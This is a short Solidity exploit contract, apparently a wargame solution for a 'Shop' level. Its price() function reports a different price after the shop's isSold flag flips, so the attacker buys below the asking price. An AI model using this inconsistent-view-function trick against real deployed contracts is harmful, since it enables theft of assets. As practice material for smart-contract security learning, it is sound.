// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level21.sol";

contract Attack {
    function price() external view returns (uint256) {
        Shop _instance = Shop(msg.sender);
        return _instance.isSold() ? 0 : _instance.price();
    }

    function atatatak(Shop _instance) public {
        _instance.buy();
    }
}
